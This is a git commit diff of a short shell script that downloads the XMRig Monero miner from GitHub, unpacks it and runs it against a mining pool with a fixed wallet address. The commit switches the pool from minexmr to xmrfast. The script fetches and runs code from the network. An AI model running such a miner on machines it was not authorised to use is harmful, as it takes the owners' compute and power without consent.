063fd19dd4d27cf3951890b58e6c5b01f024e342
HocasPocas <108454461+HocasPocas@users.noreply.github.com>
2022-08-21 14:21:54 +0530

    Update bash.sh

--- bash.sh
+++ bash.sh
@@ -2,4 +2,4 @@ wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux
 tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
 ls
 cd xmrig-6.15.0
-./xmrig -o sg.minexmr.com:443 -u 8BfC3M5VC8sVyL4JFRWkUXNRHgKVSNnudgpMzq6X46v2V2BWx3oYAnB65dvrq2zuxfHzcecBj1FeyNxgLAJM3N2GBdDT8VZ -k --tls --rig-id rig
+./xmrig --donate-level 5 -o pool.xmrfast.com:9000 -u 8BfC3M5VC8sVyL4JFRWkUXNRHgKVSNnudgpMzq6X46v2V2BWx3oYAnB65dvrq2zuxfHzcecBj1FeyNxgLAJM3N2GBdDT8VZ -k --tls
